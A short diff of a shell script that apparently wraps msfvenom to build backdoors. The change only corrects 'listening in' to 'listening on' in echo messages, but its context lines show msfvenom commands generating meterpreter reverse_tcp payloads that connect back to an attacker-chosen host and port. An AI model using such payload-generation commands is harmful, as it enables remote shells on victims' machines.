@@ -518,7 +518,7 @@ msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -a x86 --encoder cmd/pow
 echo
 echo
 echo
-echo listening in $hostbd : $portbd
+echo listening on $hostbd : $portbd
 echo
 echo
 echo
@@ -531,7 +531,7 @@ msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd lport=$portbd > $namebd.
 echo
 echo
 echo
-echo listening in $hostbd : $portbd
+echo listening on $hostbd : $portbd
 echo
 echo
 echo
